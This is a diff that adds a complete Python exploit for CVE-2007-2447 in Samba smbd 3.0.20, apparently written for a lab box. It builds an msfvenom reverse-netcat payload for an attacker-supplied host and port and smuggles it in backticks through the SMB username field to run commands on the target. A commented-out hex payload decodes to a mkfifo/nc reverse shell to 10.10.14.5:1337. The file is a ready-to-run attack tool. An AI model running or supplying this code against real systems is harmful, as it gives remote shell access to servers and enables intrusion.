@@ -1,0 +1,72 @@
+#!/usr/bin/python3
+#exploit Samba smbd 3.0.20-Debian
+from smb import *
+from smb.SMBConnection import *
+from subprocess import getoutput
+import argparse
+
+
+def generate_payload(lh, lp):
+	payload = getoutput(f"msfvenom -p cmd/unix/reverse_netcat LHOST={lh} LPORT={lp} -f python 2>/dev/null | tail -n +1")
+	#print(type(lh), type(lp))
+	final_cmd = (payload)
+	#print(final_cmd)
+	"""
+	in case of a print statement
+	def get_payload():
+	    tmp = sys.stdout
+	    sys.stdout = StringIO()
+	    exec(msfvenom() + "\nprint(buf)")
+	    buf = sys.stdout.getvalue()
+	    # restore stdout
+	    sys.stdout = tmp
+	    return buf
+	    thanks to @Tony_Bamanaboni#0789 on discord
+	"""
+
+	l = {}
+	exec(final_cmd, {}, l)
+	return l["buf"] 
+	
+
+
+def main():
+	parser = argparse.ArgumentParser(description = "Exploit Samba smbd 3.0.20-Debian CVE-2007-2447")
+	parser.add_argument("-lh", type=str, help="LHOST -> attacker", required=True)
+	parser.add_argument("-lp", type=str, help="LPORT -> attacker port", required=True)
+	parser.add_argument("-t", type=str, help="target -> target ip", required=True)
+	parser.usage = parser.format_help()
+	args = parser.parse_args()
+
+	
+	#buf = generate_payload("10.10.14.170", 1337)
+	buf = generate_payload(args.lh, int(args.lp)).decode()
+
+	#print(f"here take the output biatch: {buf}")
+	#exit(-1)
+	print("Payload created & now sending it....")
+
+	userID = "/=` nohup " + buf + "`"
+	password = "password"
+	victim_ip = args.t
+
+	conn = SMBConnection(userID, password, "HELLO", "TEST", use_ntlm_v2=False)
+	conn.connect(victim_ip, 445)
+
+
+if __name__ == '__main__':
+	main()
+
+
+
+# Old booooooring process
+# #msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.5 LPORT=1337 -f python
+# buf =  ""
+# buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6d"
+# buf += "\x68\x63\x6d\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31\x30"
+# buf += "\x2e\x31\x34\x2e\x35\x20\x31\x33\x33\x37\x20\x30\x3c"
+# buf += "\x2f\x74\x6d\x70\x2f\x6d\x68\x63\x6d\x20\x7c\x20\x2f"
+# buf += "\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70\x2f"
+# buf += "\x6d\x68\x63\x6d\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d"
+# buf += "\x20\x2f\x74\x6d\x70\x2f\x6d\x68\x63\x6d"
+# print(buf)
